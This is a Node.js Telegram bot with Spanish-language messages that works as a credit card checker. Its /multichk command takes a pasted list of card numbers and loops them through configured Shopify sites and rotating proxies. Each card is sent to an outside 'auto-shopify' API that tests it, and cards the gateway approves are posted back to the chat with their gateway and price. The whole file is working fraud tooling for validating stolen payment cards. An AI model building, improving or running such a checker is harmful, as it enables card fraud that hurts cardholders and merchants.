require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = Number(process.env.OWNER_ID);
const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';

if (!BOT_TOKEN) {
  console.error('BOT_TOKEN no definido');
  process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

/* ================== DATA ================== */
const DATA_FILE = './data.json';
let data = fs.existsSync(DATA_FILE)
  ? JSON.parse(fs.readFileSync(DATA_FILE))
  : { sites: [], proxies: [], activeSite: null, activeProxy: null };

function saveData() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  return id === OWNER_ID;
}

/* ================== RUNTIME ================== */
const running = {}; // chatId => boolean

/* ================== API ================== */
async function callChkAPI({ site, cc, proxy }) {
  try {
    const res = await axios.get(API_BASE, {
      params: { site, cc, proxy },
      timeout: 30000
    });

    const d = res.data || {};
    const response = String(d.Response || '').toUpperCase();

    return {
      approved: response.includes('APPRO'),
      response: d.Response || 'NO_RESPONSE',
      gateway: d.Gateway || 'N/A',
      price: d.Price || 'N/A',
      cc
    };
  } catch {
    return {
      approved: false,
      response: 'API_ERROR',
      cc
    };
  }
}

/* ================== START ================== */
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
`🤖 Bot activo

Configura:
• data.json → sites[] y proxies[]

Luego usa:
• /multichk
• /stop`
  );
});

/* ================== MULTI-CHK SECUENCIAL ================== */
bot.onText(/\/multichk([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!data.sites.length || !data.proxies.length) {
    return bot.sendMessage(
      chatId,
      '❌ Añade sites y proxies en data.json primero'
    );
  }

  const input = match[1].trim();
  if (!input) {
    return bot.sendMessage(chatId, '❌ Envía tarjetas después del comando');
  }

  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);
  running[chatId] = true;

  let approved = 0;
  let declined = 0;

  const total =
    data.sites.length * data.proxies.length * ccs.length;
  let done = 0;

  const progressMsg = await bot.sendMessage(
    chatId,
    `⏳ 0/${total}`
  );

  for (const site of data.sites) {
    for (const proxy of data.proxies) {
      for (const cc of ccs) {
        if (!running[chatId]) break;

        const r = await callChkAPI({ site, cc, proxy });

        if (r.approved) {
          approved++;
          await bot.sendMessage(
            chatId,
`━━━━━━━━━━━━━━
💳 ${r.cc}
🏪 ${r.gateway}
💰 ${r.price}
✅ ${r.response}`
          );
        } else {
          declined++;
        }

        done++;
        try {
          await bot.editMessageText(
            `⏳ ${done}/${total}\n✅ ${approved} ❌ ${declined}`,
            {
              chat_id: chatId,
              message_id: progressMsg.message_id
            }
          );
        } catch {}
      }
      if (!running[chatId]) break;
    }
    if (!running[chatId]) break;
  }

  running[chatId] = false;

  bot.sendMessage(
    chatId,
`✅ Finalizado
Total: ${total}
Aprobadas: ${approved}
Rechazadas: ${declined}`
  );
});

/* ================== STOP ================== */
bot.onText(/\/stop/, (msg) => {
  running[msg.chat.id] = false;
  bot.sendMessage(msg.chat.id, '⛔ Proceso detenido');
});
